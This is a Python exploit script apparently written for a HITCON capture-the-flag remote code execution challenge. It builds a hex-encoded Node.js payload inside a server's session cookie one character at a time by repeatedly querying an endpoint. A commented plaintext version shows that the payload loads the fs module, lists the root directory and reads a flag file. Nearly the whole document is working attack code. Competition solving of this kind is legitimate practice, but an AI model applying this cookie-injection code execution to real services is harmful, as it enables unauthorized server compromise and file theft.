import requests

url = 'http://211p8i4e68.rce.chal.hitconctf.com/'
url2 = 'http://211p8i4e68.rce.chal.hitconctf.com/random'
# /flag-1e5657085ea974db77cdef03cc5753833fea1668
# /flag-1e5657085ea974db77cdef03cc5753833fea1668
'''
payload = [ 'f=require("fs");;;;;',
            'f.readdirSync("/");;',
            's1="/flag-1e565708";',
            's2="5ea974db77cde";;',
            's3="f03cc5753833";;;',
            's4="fea1668";;;;;;;;',
            's5=s1+s2+s3+s4;;;;;;',
            'x="utf-8";;;;;;;;;;;',
            'f.readFileSync(s5,x)'
          ]
'''
payload = [	'663d726571756972652822667322293b3b3b3b3b',
			'662e7265616464697253796e6328222f22293b3b',
			'73313d222f666c61672d3165353635373038223b',
			'73323d2235656139373464623737636465223b3b',
			'73333d22663033636335373533383333223b3b3b',
			'73343d2266656131363638223b3b3b3b3b3b3b3b',
			'73353d73312b73322b73332b73343b3b3b3b3b3b',
			'783d227574662d38223b3b3b3b3b3b3b3b3b3b3b',
			'662e7265616446696c6553796e632873352c7829']
ptr = 0

current_cookies = ''
r = requests.get(url=url, params='/')
print(r.cookies, r.status_code)
current_cookies = r.cookies

for p in payload:
	start = 36
	ptr = 0
	print(p, len(p))
	assert len(p) == 40
	while ptr < len(p):
		r2 = requests.get(url=url2, cookies=current_cookies)
		s = str(r2.cookies)
		if s[start] == p[ptr]:
			current_cookies = r2.cookies
			ptr = ptr + 1
			start = start + 1
			print(s, r2.status_code)
	r = requests.get(url=url2, cookies=current_cookies)
	current_cookies = r.cookies
	print(f'2> {r.content}')
	print(f'2> {current_cookies}')
